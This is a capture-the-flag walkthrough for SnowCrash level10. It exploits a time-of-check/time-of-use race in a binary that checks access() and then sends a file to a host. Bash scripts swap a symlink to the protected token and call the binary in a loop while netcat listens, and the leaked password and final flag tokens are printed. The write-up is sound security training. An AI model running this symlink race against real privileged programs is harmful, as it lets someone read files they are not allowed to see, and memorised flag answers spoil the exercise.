When we started the level10, we can see two differents files:
- A binary called **level10**
- A file called **token**

We do not have access to token, but **level10** seems to have it.

**level10** is a binary that connect to a host a send the content of a file to it.

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

by doing ``strings ./level10``, we can see that it use the function *access* and listen to the port *6969*.
By doing some research, it seems that the use of access isn't recommended due to a *TOCTTOU* security issue.

We then wrote two script in the tmp:

- **loop.sh** that create and change the file **/tmp/test**
```bash
#!/bin/bash

while true; do
        echo "" > /tmp/test;
        sleep 0.1;
        ln -sf /home/user/level10/token /tmp/test;
        sleep 0.1;
        rm /tmp/test;
done
```

- **loop_exec.sh** that repeat the call of the binary with **/tmp/test** as parameter
```bash
#!/bin/bash

while true; do
        /home/user/level10/level10 /tmp/test 127.0.0.1
done
```

We execute both script and use *nc* to watch what **level10** is sending.

```bash
level10@SnowCrash:~$ nc -lk localhost 6969
.*( )*.
[...]
.*( )*.
woupa2yuojeeaaed06riuj63c
```
``woupa2yuojeeaaed06riuj63c`` is the token to access flag10.

``` bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```